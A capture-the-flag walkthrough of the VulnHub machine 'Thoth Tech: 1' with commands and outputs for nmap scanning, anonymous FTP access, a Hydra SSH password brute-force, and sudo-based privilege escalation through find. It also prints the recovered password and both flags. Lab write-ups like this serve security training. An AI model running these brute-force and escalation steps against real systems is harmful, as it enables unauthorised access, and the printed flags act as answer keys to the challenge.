# Thoth Tech: 1 (VulnHub)

## Overview

**Thoth Tech: 1** is an Easy-level VulnHub machine created by **pwnlab.me**. The challenge focuses on service enumeration, anonymous FTP access, credential discovery, SSH brute forcing, Linux privilege escalation, and GTFOBins abuse. The objective is to obtain user and root access by exploiting weak credentials and misconfigured sudo permissions.

---

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Thoth Tech: 1 |
| Author | pwnlab.me |
| Series | Thoth Tech |
| Platform | VulnHub |
| Release Date | 3 August 2021 |
| Difficulty | Easy |
| Target OS | Linux |

---

## Skills Demonstrated

- Network Discovery
- Service Enumeration
- FTP Enumeration
- Anonymous FTP Access
- Information Disclosure
- Credential Discovery
- SSH Brute Forcing
- Hydra Usage
- Linux Enumeration
- Sudo Privilege Enumeration
- GTFOBins Exploitation
- Privilege Escalation
- Post Exploitation

---

## Tools Used

- Netdiscover
- Nmap
- FTP Client
- Hydra
- SSH
- GTFOBins

---

## Attack Methodology

1. Network Discovery
2. Port Enumeration
3. FTP Enumeration
4. Username Discovery
5. SSH Password Attack
6. SSH Access
7. User Enumeration
8. Sudo Enumeration
9. Privilege Escalation
10. Root Access
11. Flag Retrieval

---

## Network Discovery

Identify active hosts on the network.

```bash
sudo netdiscover -i eth0
```

### Result

```text
192.168.10.28
```

Target identified successfully. 

---

## Port Scanning and Enumeration

Perform service detection and default script scanning.

```bash
sudo nmap -sC -sV -Pn 192.168.10.28 --min-rate 10000
```

### Open Ports

| Port | Service | Version |
|--------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

### Interesting Findings

```text
Anonymous FTP login enabled
SSH service available
Apache web server running
```

---

## FTP Enumeration

Connect to the FTP service using anonymous access.

```bash
ftp 192.168.10.28
```

### Credentials

```text
Username: anonymous
Password: anonymous
```

List available files:

```bash
dir
```

### Discovered File

```text
note.txt
```

Download and review the file contents. The note reveals a valid username and suggests that the password is weak. 

### Username Discovered

```text
pwnlab
```

---

## SSH Password Attack

Use Hydra to perform a password attack against SSH.

```bash
hydra -l pwnlab -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.28
```

### Credentials Found

```text
Username: pwnlab
Password: babygirl1
```

Successful authentication credentials recovered. 

---

## SSH Access

Connect to the target system.

```bash
ssh pwnlab@192.168.10.28
```

Verify access:

```bash
whoami
```

### Output

```text
pwnlab
```

User-level access obtained successfully. 

---

## User Flag

List files within the user's home directory.

```bash
ls
```

### Output

```text
user.txt
```

Retrieve the user flag.

```text
5ec2a44a73e7b259c6b0abc174291359
```

---

## Privilege Escalation Enumeration

Check sudo permissions.

```bash
sudo -l
```

### Output

```text
(root) NOPASSWD: /usr/bin/find
```

The user can execute the `find` binary as root without a password. This binary is documented on GTFOBins as a privilege escalation vector.

---

## Privilege Escalation

A misconfigured sudo rule allows escalation through the `find` binary. 

### Root Verification

```text
uid=0(root)
gid=0(root)
```

Root privileges successfully obtained. 

---

## Root Flag

Navigate to the root directory and locate the flag.

### Output

```text
root.txt
```

### Root Flag

```text
d51546d5bcf8e3856c7bff5d201f0df6
```

---

## Vulnerabilities Identified

### Anonymous FTP Access

FTP service allowed anonymous authentication, exposing sensitive files.

### Information Disclosure

The FTP note revealed a valid username and hinted at weak password practices.

### Weak Credentials

The SSH account was protected by a predictable password.

### Misconfigured Sudo Permissions

The user could execute privileged binaries without authentication.

### GTFOBins Abuse

A dangerous sudo configuration allowed privilege escalation through a GTFOBins technique.

---

## Attack Chain Summary

```text
Network Discovery
        ↓
Port Enumeration
        ↓
Anonymous FTP Access
        ↓
Username Discovery
        ↓
SSH Password Attack
        ↓
SSH Access
        ↓
User Flag
        ↓
Sudo Enumeration
        ↓
Privilege Escalation
        ↓
Root Access
        ↓
Root Flag
```

---

## Security Recommendations

- Disable anonymous FTP access.
- Enforce strong password policies.
- Implement account lockout mechanisms.
- Monitor authentication attempts.
- Apply least privilege principles.
- Restrict sudo permissions to necessary commands only.
- Audit privileged binaries regularly.
- Remove unnecessary services.
- Conduct periodic security assessments.

---

## Flags Retrieved

### User Flag

```text
5ec2a44a73e7b259c6b0abc174291359
```

### Root Flag

```text
d51546d5bcf8e3856c7bff5d201f0df6
```

---

## Key Learning Outcomes

- FTP Enumeration Techniques
- Credential Discovery
- Password Security Weaknesses
- SSH Authentication Attacks
- Linux Enumeration
- Sudo Misconfiguration Exploitation
- GTFOBins Privilege Escalation
- Post-Exploitation Methodology
- Linux Privilege Escalation Fundamentals

---

## Conclusion

Thoth Tech: 1 demonstrates how weak credentials, exposed information, and insecure sudo configurations can lead to complete system compromise. The machine provides practical experience with FTP enumeration, SSH attacks, privilege escalation, and Linux post-exploitation techniques, making it an excellent beginner-friendly VulnHub challenge. 

---

**Author:** Omkar Babaji Sawant  
**Repository:** VulnHub-Walkthroughs
